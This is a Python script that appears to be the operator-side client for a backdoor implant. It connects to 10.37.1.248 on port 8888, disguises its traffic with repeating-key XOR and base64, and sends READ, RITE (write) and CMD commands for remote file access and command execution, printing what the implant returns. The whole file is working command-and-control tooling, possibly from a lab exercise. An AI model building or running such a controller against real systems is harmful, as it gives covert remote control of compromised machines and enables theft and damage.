# https://www.geeksforgeeks.org/python/socket-programming-python/
import socket             
import random          
# import pwn  
import base64 

s = socket.socket()     
    
def fixed_xor(arg1: bytes, arg2: bytes) -> bytes:
    assert len(arg1) == len(arg2), "Trying to xor mismatched lengths!"
    return bytes([arg1[i] ^ arg2[i] for i in range(len(arg1))])
  
def xor(message: bytes, key: bytes) -> bytes:
    """XOR a message with a repeating key.

    Works for messages of any length, including empty messages, without
    asserting on the length. This avoids crashes when the socket returns
    zero bytes (peer closed the connection).
    """
    if not message:
        return b""
    ret = []
    for i in range(len(message)):
        ret.append(message[i] ^ key[i % len(key)])
    return bytes(ret)

def enc(plaintext):
  return base64.encodebytes(xor(plaintext, key))

def dec(ciphertext):
  return xor(base64.decodebytes(ciphertext), key)

port = 8888
key = b"ED IS COOL"
s.connect(('10.37.1.248', port)) 

types = ['HELO', 'EXIT', 'READ', 'RITE', 'CMD', 'ERR']

def parse(s: socket.socket, user_input):
    user_input = user_input.split(' ')
    type = user_input[0]
    id = str(random.randint(0, 10 ** 9))
    data = " ".join(user_input[1:])
    assert type in types, f"unknown type {type} of length {len(type)}"
    if type in ['READ', 'RITE', 'CMD']:
        assert(data != '')
    else:
        assert(data == '')
    s.send(enc(("  ".join([type, id, data])).encode()))
while True:
    # Send a command
    parse(s, input('> '))

    # Receive the response; handle clean disconnects gracefully.
    ciphertext = s.recv(4096)
    if not ciphertext:
        print("[!] Connection closed by implant")
        break

    try:
        response = dec(ciphertext).decode().replace('\\n', '\n')
    except Exception as e:
        print(f"[!] Error decoding response: {e}")
        break

    print(response)


s.close()